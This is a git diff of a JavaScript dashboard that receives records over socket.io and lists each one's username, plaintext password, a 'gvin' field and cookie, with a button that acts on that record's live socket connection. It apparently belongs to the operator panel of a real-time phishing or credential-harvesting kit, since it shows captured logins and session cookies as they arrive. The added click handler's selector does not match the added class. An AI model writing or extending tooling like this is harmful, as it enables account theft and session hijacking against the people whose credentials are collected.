@@ -5,16 +5,19 @@ socket.on("returnAll",(datas)=>{
     console.log(datas)
     $("#main").html("");
     datas.forEach(data => {
-        $("#main").append('<tr><td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" onclick="logout('+data.socket+')" class="btn btn-primary">Logout</button></td></tr>');
+        $("#main").append('<tr><td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" skid="'+data.socket+'" onclick="logout('+data.socket+')" class="logout btn btn-primary">Logout</button></td></tr>');
     });
 })
 socket.on("loginchange",(datas)=>{
     console.log(datas)
     datas.forEach(data => {
-        $("#main").append('<tr><td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" onclick="logout('+data.socket+')" class="btn btn-primary">Logout</button></td></tr>');
+        $("#main").append('<tr><td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" skid="'+data.socket+'" onclick="logout('+data.socket+')" class="logout btn btn-primary">Logout</button></td></tr>');
     });
 })
 function logout(sessid){
     console.log(sessid);
     socket.emit("logoutacc",sessid)
 }
+$(".button-login").on('click', function () {
+    skid = $(this).attr("skid");
+})
